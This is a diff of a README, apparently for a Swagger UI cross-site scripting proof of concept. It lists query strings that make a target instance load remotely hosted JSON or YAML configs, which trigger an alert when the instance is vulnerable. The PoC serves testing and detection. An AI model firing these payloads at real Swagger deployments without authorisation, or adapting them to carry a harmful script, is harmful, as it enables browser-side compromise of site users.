@@ -14,23 +14,25 @@ Use the following query strings with a vulnerable Swagger UI path, such as:
 
 `https://target-swagger.com/swagger/index.html?<QUERY>`
 
-Example: `https://target-swagger.com/swagger/index.html?configUrl=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.json`
+##### Example: 
+
+`https://target-swagger.com/swagger/index.html?configUrl=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.json`
 
 #### JSON-based PoC
 
-?url=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.json
+`?url=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.json`
 
-?config=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.json
+`?config=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.json`
 
-?configUrl=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.json
+`?configUrl=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.json`
 
 #### YAML-based PoC
 
-?url=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.yaml
+`?url=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.yaml`
 
-?config=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.yaml
+`?config=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.yaml`
 
-?configUrl=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.yaml
+`?configUrl=https://raw.githubusercontent.com/c4m0uflag3/swagger-xss-poc/refs/heads/main/xss.yaml`
 
 
 If the instance is vulnerable, the following will execute: alert("XSS-Found!")
